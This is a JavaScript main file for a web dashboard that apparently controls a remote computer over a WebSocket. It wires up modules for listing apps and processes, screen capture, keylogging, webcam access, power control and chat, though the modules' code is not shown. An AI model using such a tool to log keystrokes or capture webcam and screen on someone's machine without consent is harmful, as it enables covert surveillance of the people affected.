import { WebSocketManager } from './core/websocket.js';
import { SystemLogger } from './core/logger.js';
import { TabManager } from './ui/tabs.js';
import { ModalManager } from './ui/modal.js';
import { StatusManager } from './ui/status.js';
import { AppsManager } from './features/apps.js';
import { ProcessesManager } from './features/processes.js';
import { ScreenCaptureManager } from './features/screen.js';
import { KeyloggerManager } from './features/keylogger.js';
import { WebcamManager } from './features/webcam.js';
import { PowerManager } from './features/power.js';
import { parseQueryString, preventSpaceKeyOnButtons } from './utils/helpers.js';

class Application {
    constructor() {
        // Parse query params
        const { serverIp } = parseQueryString();
        const wsUrl = `ws://${serverIp}:8080/`;
        
        console.log(`Connecting to: ${wsUrl}`);
        
        // Initialize core services
        this.ws = new WebSocketManager(wsUrl);
        this.logger = new SystemLogger('chat-content');
        
        // Initialize UI managers
        this.tabs = new TabManager();
        this.modal = new ModalManager();
        this.status = new StatusManager();
        
        // Initialize feature managers
        this.apps = new AppsManager(this.ws, this.logger);
        this.processes = new ProcessesManager(this.ws, this.logger);
        this.screen = new ScreenCaptureManager(this.ws, this.logger, this.modal);
        this.keylogger = new KeyloggerManager(this.ws, this.logger);
        this.webcam = new WebcamManager(this.ws, this.logger);
        this.power = new PowerManager(this.ws, this.logger);
        
        this.setupGlobalListeners();
        this.ws.connect();
    }

    setupGlobalListeners() {
        // WebSocket connection events
        this.ws.on('connected', () => {
            this.status.setOnline();
            this.refreshCurrentTab();
        });

        this.ws.on('disconnected', () => {
            this.status.setOffline();
        });

        // Handle general status messages
        this.ws.on('message', (data) => {
            if (data.trang_thai) {
                this.logger.log(`[${data.trang_thai}] ${data.thong_bao}`);
                if (data.trang_thai === 'thanh_cong') {
                    this.refreshCurrentTab();
                }
            }
        });

        // Chat functionality
        const chatInput = document.getElementById('chatInput');
        const sendBtn = document.getElementById('btn-send-chat');
        
        sendBtn.addEventListener('click', () => this.sendChat());
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.sendChat();
            }
        });

        // Prevent space key on buttons
        preventSpaceKeyOnButtons();
    }

    refreshCurrentTab() {
        if (!this.ws.isConnected()) return;
        
        const currentTab = this.tabs.getCurrentTab();
        
        if (currentTab === 'apps') {
            this.apps.refresh();
        } else if (currentTab === 'processes') {
            this.processes.refresh();
        }
    }

    sendChat() {
        const input = document.getElementById('chatInput');
        const val = input.value.trim();
        
        if (val && this.ws.isConnected()) {
            this.ws.send(val);
            this.logger.log("ME: " + val);
        input.value = '';
        }
    }
}
// Initialize app when DOM is ready
window.addEventListener('DOMContentLoaded', () => {
window.app = new Application();
});